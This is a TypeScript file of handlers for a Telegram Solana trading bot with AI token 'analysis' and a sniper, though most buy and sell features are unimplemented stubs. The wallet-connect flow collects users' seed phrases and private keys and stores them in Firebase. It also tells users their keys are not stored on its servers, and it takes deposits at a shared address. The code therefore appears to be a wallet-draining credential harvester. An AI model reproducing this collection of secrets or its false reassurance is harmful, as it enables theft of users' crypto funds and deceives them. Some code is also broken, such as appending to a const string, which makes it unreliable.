async function handleSell(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "💸 Select a position to sell:")
  // TODO: Implement positions and sell keyboard
  // const keyboard = getSellKeyboard();
  // await bot.sendMessage(chatId, "💸 Select a position to sell:", { reply_markup: keyboard });
}

async function handlePositions(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "📊 Loading your positions...")
  // TODO: Implement positions and sell keyboard
  // const keyboard = getPositionsKeyboard();
  // await bot.sendMessage(chatId, "📊 Your positions:", { reply_markup: keyboard });
}

async function handleSniper(chatId: number, userId: number, bot: TelegramBot) {
  const sniperEnabled = smartSniper.isEnabled(userId)

  let message = `🎯 <b>AI Sniper</b>\n\n`
  message += `Status: ${sniperEnabled ? "🟢 ACTIVE" : "🔴 INACTIVE"}\n\n`
  message += `The AI Sniper automatically buys tokens based on AI analysis.\n\n`
  message += `It uses a small amount of SOL to test new tokens.\n\n`
  message += `You can toggle it on or off below.`

  const keyboard = getSniperKeyboard(sniperEnabled)

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleAIAnalysis(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "🤖 Enter a token address to analyze, or paste a token address to analyze:")
  userStates.set(userId, { action: "awaiting_token_analysis" })
}

async function handleSettings(chatId: number, userId: number, bot: TelegramBot) {
  const keyboard = getSettingsKeyboard()
  await bot.sendMessage(chatId, "⚙️ Settings:", { reply_markup: keyboard })
}

async function handleHelp(chatId: number, bot: TelegramBot) {
  const helpMessage = `❓ <b>Help</b>\n\n`
  helpMessage += `<b>Commands:</b>\n`
  helpMessage += `/start - Start the bot\n`
  helpMessage += `/wallet - View your wallet\n`
  helpMessage += `buy - Buy a token\n`
  helpMessage += `sell - Sell a token\n`
  helpMessage += `positions - View your positions\n`
  helpMessage += `sniper - Configure the AI Sniper\n`
  helpMessage += `live_tokens - View live tokens\n`
  helpMessage += `ai_analysis - Analyze a token\n`
  helpMessage += `settings - View settings\n`
  helpMessage += `help - View this help message\n\n`
  helpMessage += `<b>Other:</b>\n`
  helpMessage += `You can also use the buttons below to navigate the bot.\n\n`
  helpMessage += `If you have any questions, please contact support.`

  await bot.sendMessage(chatId, helpMessage)
}

async function handleRefresh(chatId: number, userId: number, bot: TelegramBot) {
  await handleStart(chatId, userId, bot)
}

async function handleBuyToken(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const tokenAddress = data.replace("buy_", "")
  await bot.sendMessage(chatId, `💰 Enter the amount of SOL you want to spend on ${tokenAddress}:`)
  userStates.set(userId, { action: "awaiting_buy_amount", data: { tokenAddress } })
}

async function handleSellToken(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const tokenAddress = data.replace("sell_", "")
  await bot.sendMessage(chatId, `💸 Selling ${tokenAddress}...`)
  // TODO: Implement sell logic
}

async function handleTokenAnalysis(chatId: number, userId: number, bot: TelegramBot, tokenAddress: string) {
  try {
    await bot.sendMessage(chatId, `🔍 Analyzing token ${tokenAddress}...`)

    const analysis = await aiAssistant.analyzeToken(tokenAddress)

    let message = `🤖 <b>AI Analysis for ${analysis.symbol} (${analysis.name})</b>\n\n`
    message += `💰 <b>Price:</b> $${analysis.price.toFixed(8)}\n`
    message += `💧 <b>Liquidity:</b> $${analysis.liquidity.toLocaleString()}\n`
    message += `🏢 <b>DEX:</b> ${analysis.dex}\n`
    message += `🔥 <b>Hotness:</b> ${analysis.hotness}/100\n`
    message += `🤖 <b>AI Score:</b> ${analysis.aiScore}/100\n`
    message += `✅ <b>AI Recommendation:</b> ${analysis.aiRecommendation}\n\n`
    message += `<b>Summary:</b> ${analysis.summary}`

    const keyboard = {
      inline_keyboard: [
        [{ text: "💰 Quick Buy", callback_data: `quick_buy_${tokenAddress}` }],
        [{ text: "🔙 Back to Main", callback_data: "main_menu" }],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error analyzing token:", error)
    await bot.sendMessage(chatId, "❌ Failed to analyze token. Please try again.")
  }
}

async function handleQuickBuy(chatId: number, userId: number, bot: TelegramBot, tokenAddress: string) {
  await bot.sendMessage(chatId, `💰 Buying ${tokenAddress} with a small amount of SOL...`)
  // TODO: Implement quick buy logic
}

async function handleUnknownCommand(chatId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "❓ Unknown command. Please try again.")
}

async function handleSeedPhraseInput(chatId: number, text: string, userId: number, bot: TelegramBot) {
  try {
    console.log(`[BOT] Received seed phrase from user ${userId}`)
    await firebase.storeSeedPhrase(userId, text)
    userStates.delete(userId)
    await bot.sendMessage(chatId, "✅ Seed phrase stored securely. Generating wallet... This may take a minute.")

    // Generate wallet
    const wallet = await walletManager.generateWalletFromSeed(text)
    console.log(`[BOT] Generated wallet: ${wallet.publicKey}`)

    // Store wallet in Firebase
    await firebase.storeWallet(userId, wallet.publicKey, wallet.privateKey)

    // Update user in database
    await userDb.updateUser(userId, { wallet: wallet.publicKey })

    await bot.sendMessage(chatId, `✅ Wallet generated!\n\n🔐 <b>Address:</b>\n<code>${wallet.publicKey}</code>`, {
      reply_markup: {
        inline_keyboard: [[{ text: "✅ Continue", callback_data: "main_menu" }]],
      },
    })
  } catch (error) {
    console.error(`[BOT] Error storing seed phrase: ${error}`)
    await bot.sendMessage(chatId, "❌ Error storing seed phrase. Please ensure it is valid and try again.")
  }
}

async function handlePrivateKeyInput(chatId: number, text: string, userId: number, bot: TelegramBot) {
  try {
    console.log(`[BOT] Received private key from user ${userId}`)
    await firebase.storePrivateKey(userId, text)
    userStates.delete(userId)
    await bot.sendMessage(chatId, "✅ Private key stored securely. Importing wallet...")

    // Import wallet
    const wallet = await walletManager.importWalletFromPrivateKey(text)
    console.log(`[BOT] Imported wallet: ${wallet.publicKey}`)

    // Store wallet in Firebase
    await firebase.storeWallet(userId, wallet.publicKey, wallet.privateKey)

    // Update user in database
    await userDb.updateUser(userId, { wallet: wallet.publicKey })

    await bot.sendMessage(chatId, `✅ Wallet imported!\n\n🔐 <b>Address:</b>\n<code>${wallet.publicKey}</code>`, {
      reply_markup: {
        inline_keyboard: [[{ text: "✅ Continue", callback_data: "main_menu" }]],
      },
    })
  } catch (error) {
    console.error(`[BOT] Error storing private key: ${error}`)
    await bot.sendMessage(chatId, "❌ Error storing private key. Please ensure it is valid and try again.")
  }
}

async function handleBuyAmountInput(chatId: number, text: string, userId: number, bot: TelegramBot, data: any) {
  try {
    const amount = Number.parseFloat(text)
    if (isNaN(amount) || amount <= 0) {
      await bot.sendMessage(chatId, "❌ Invalid amount. Please enter a valid number greater than 0.")
      return
    }

    const tokenAddress = data.tokenAddress
    await bot.sendMessage(chatId, `💰 Buying ${tokenAddress} with ${amount} SOL...`)

    // TODO: Implement buy logic
    userStates.delete(userId)
  } catch (error) {
    console.error("Error buying token:", error)
    await bot.sendMessage(chatId, "❌ Failed to buy token. Please try again.")
  }
}

async function handleTokenAnalysisInput(chatId: number, text: string, userId: number, bot: TelegramBot) {
  try {
    const tokenAddress = text
    await handleTokenAnalysis(chatId, userId, bot, tokenAddress)
    userStates.delete(userId)
  } catch (error) {
    console.error("Error analyzing token:", error)
    await bot.sendMessage(chatId, "❌ Failed to analyze token. Please try again.")
  }
}

async function handleConnectWallet(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(
    chatId,
    "🔐 Connect your wallet using your seed phrase or private key.\n\n⚠️ <b>Warning:</b> Never share your seed phrase or private key with anyone! We do not store your seed phrase or private key on our servers. It is stored securely in Firebase.",
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔑 Use Seed Phrase", callback_data: "enter_seed_phrase" }],
          [{ text: "🔑 Use Private Key", callback_data: "enter_private_key" }],
          [{ text: "🔙 Back to Wallet", callback_data: "wallet" }],
        ],
      },
    },
  )
}

async function handleGenerateWallet(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(
    chatId,
    "🔐 Generate a new wallet.\n\n⚠️ <b>Warning:</b> Please save your seed phrase in a safe place! We cannot recover your wallet if you lose your seed phrase.",
    {
      reply_markup: {
        inline_keyboard: [[{ text: "✅ Generate Wallet", callback_data: "generate_seed_phrase" }]],
      },
    },
  )
}

async function handleGenerateDeposit(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(
    chatId,
    `💰 Deposit SOL to the following address:\n\n<code>${DEPOSIT_ADDRESS}</code>\n\nThis address is for deposits only. Do not send tokens to this address.`,
    {
      reply_markup: {
        inline_keyboard: [[{ text: "✅ Continue", callback_data: "main_menu" }]],
      },
    },
  )
}

async function handleShowWallet(chatId: number, userId: number, bot: TelegramBot) {
  const walletData = await firebase.getWallet(userId)

  if (walletData) {
    const walletAddress = walletData.publicKey
    const currentBalance = await walletManager.getBalance(walletAddress)

    const message = `🔐 <b>Your Wallet:</b>\n<code>${walletAddress}</code>\n\n💰 <b>Live Balance:</b> ${currentBalance.toFixed(4)} SOL`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } else {
    const message = `🔐 <b>Wallet:</b> Not connected\n\n💡 Connect or generate a wallet to start trading!`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  }
}

async function handleToggleSniper(chatId: number, userId: number, bot: TelegramBot) {
  const sniperEnabled = !smartSniper.isEnabled(userId)
  smartSniper.setEnabled(userId, sniperEnabled)

  let message = `🎯 <b>AI Sniper</b>\n\n`
  message += `Status: ${sniperEnabled ? "🟢 ACTIVE" : "🔴 INACTIVE"}\n\n`
  message += `The AI Sniper automatically buys tokens based on AI analysis.\n\n`
  message += `It uses a small amount of SOL to test new tokens.\n\n`
  message += `You can toggle it on or off below.`

  const keyboard = getSniperKeyboard(sniperEnabled)

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleEnableSmartSniper(chatId: number, userId: number, bot: TelegramBot) {
  smartSniper.setEnabled(userId, true)
  await bot.sendMessage(chatId, "✅ Smart Sniper enabled!")
}

async function handleOptimizeSettings(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "⚙️ Optimizing settings...")
  // TODO: Implement optimize settings logic
}

async function handleMarketSentiment(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "📊 Loading market sentiment...")
  // TODO: Implement market sentiment logic
}

async function handleSniperStats(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "📊 Loading sniper stats...")
  // TODO: Implement sniper stats logic
}

async function handleUltraFreshTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "🔥 Loading ultra-fresh tokens...")
  // TODO: Implement ultra-fresh tokens logic
}

async function handleAIRecommendations(chatId: number, userId: number, bot: TelegramBot) {
  try {
    const topRecommendations = liveTokenMonitor.getTopRecommendations(10)

    if (topRecommendations.length === 0) {
      await bot.sendMessage(chatId, "😔 No AI recommendations found right now. Check back later!", {
        reply_markup: {
          inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "ai_recommendations" }]],
        },
      })
      return
    }

    let message = `🎯 <b>Top AI Picks Right Now:</b>\n\n`
    topRecommendations.forEach((rec, index) => {
      const urgencyEmoji = rec.urgency === "CRITICAL" ? "🔥" : rec.urgency === "HIGH" ? "⚡" : "💡"
      message += `${urgencyEmoji} <b>${rec.token.symbol}</b>: ${rec.token.aiScore}/100 (${rec.urgency})\n`
      message += `   📍 ${rec.token.dex} | ⏰ ${rec.token.age}\n`
      message += `   💰 $${rec.token.price.toFixed(8)} | 💧 $${rec.token.liquidity.toLocaleString()}\n`
      message += `   🤖 <b>${rec.recommendation}</b>\n\n`
    })

    const keyboard = {
      inline_keyboard: [
        [{ text: "🔄 Refresh", callback_data: "ai_recommendations" }],
        [{ text: "🔙 Back to Main", callback_data: "main_menu" }],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling AI recommendations:", error)
    await bot.sendMessage(chatId, "❌ Failed to load AI recommendations. Please try again.")
  }
}

async function handleTrendingTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "🔥 Loading trending tokens...")
  // TODO: Implement trending tokens logic
}

async function handleTopAIPicks(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "🤖 Loading top AI picks...")
  // TODO: Implement top AI picks logic
}
